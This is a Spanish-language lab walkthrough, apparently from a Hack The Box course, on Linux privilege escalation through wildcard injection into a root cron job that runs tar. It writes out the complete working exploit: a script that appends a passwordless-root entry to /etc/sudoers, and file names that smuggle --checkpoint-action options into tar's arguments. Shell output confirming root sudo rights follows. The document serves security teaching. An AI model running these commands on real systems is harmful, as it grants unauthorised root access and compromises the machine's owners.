Un wildcard (comodín) puede ser utilizado como reemplazo de otros caracteres y son interpretados por el shell antes de otras acciones. Ejemplos de wildcards incluyen:

|**Character**|**Significance**|
|---|---|
|`*`|Un asterisco que puede coincidir con cualquier número de caracteres en un nombre de archivo.|
|`?`|Coincide con un solo carácter.|
|`[ ]`|Corchetes que encierran caracteres y pueden coincidir con cualquier carácter único en la posición definida.|
|`~`|Una tilde al principio se expande al nombre del directorio home del usuario o puede tener otro nombre de usuario añadido para referirse al directorio home de ese usuario.|
|`-`|Un guion dentro de los corchetes denota un rango de caracteres.|

Un ejemplo de cómo los wildcards pueden ser abusados para la escalada de privilegios es el comando `tar`, un programa común para crear/extraer archivos. Si miramos la [man page](http://man7.org/linux/man-pages/man1/tar.1.html) del comando `tar`, vemos lo siguiente:



```r
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

La opción `--checkpoint-action` permite que se ejecute una acción `EXEC` cuando se alcanza un checkpoint (es decir, ejecutar un comando arbitrario del sistema operativo una vez que se ejecuta el comando tar). Al crear archivos con estos nombres, cuando se especifica el wildcard, `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh` se pasan a `tar` como opciones de línea de comandos. Veamos esto en práctica.

Consideremos el siguiente cron job, que está configurado para respaldar el contenido del directorio `/home/htb-student` y crear un archivo comprimido dentro de `/home/htb-student`. El cron job está configurado para ejecutarse cada minuto, por lo que es un buen candidato para la escalada de privilegios.



```r
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Podemos aprovechar el wildcard en el cron job para escribir los comandos necesarios como nombres de archivos teniendo en cuenta lo anterior. Cuando el cron job se ejecute, estos nombres de archivos serán interpretados como argumentos y ejecutarán cualquier comando que especifiquemos.



```r
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Podemos comprobar y ver que los archivos necesarios fueron creados.



```r
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Una vez que el cron job se ejecute nuevamente, podemos verificar los nuevos privilegios de sudo y hacer sudo a root directamente.



```r
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```